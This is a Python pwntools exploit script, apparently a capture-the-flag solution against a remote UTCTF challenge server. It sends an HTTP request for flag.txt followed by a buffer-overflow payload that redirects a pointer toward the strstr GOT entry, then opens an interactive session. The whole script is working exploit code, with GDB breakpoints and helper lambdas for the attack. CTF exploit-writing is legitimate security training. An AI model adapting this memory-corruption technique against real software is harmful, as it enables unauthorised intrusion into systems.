#! /usr/bin/python
from pwn import *

context.update(
        arch="amd64",
        endian="little",
        log_level="debug",
        os="linux",
        #terminal=["tmux", "split-window", "-h", "-p 65"]
        terminal=["st"]
)
to = 2

ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)

def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        b main
        b *0x402396
        b *0x40231f
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote("guppy.utctf.live", 5848)
    else:
        return process(binary)


def exploit(p,e):

    http_packet = b"GET /flag.txt HTTP/1.0"
    

    exp = p64(0xdeadbeef) 
    exp += cyclic(792) + p64(e.got["strstr"] - 0xf) + p64(0x20)
    p.sendline(http_packet)
    p.sendline(exp)

    end_packet = b"\r"

    p.sendline(end_packet)
    p.sendline(b"C" * 0x20000)
    
    p.interactive()
    

if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    #l = ELF("./libc.so.6")

    exploit(p,e)
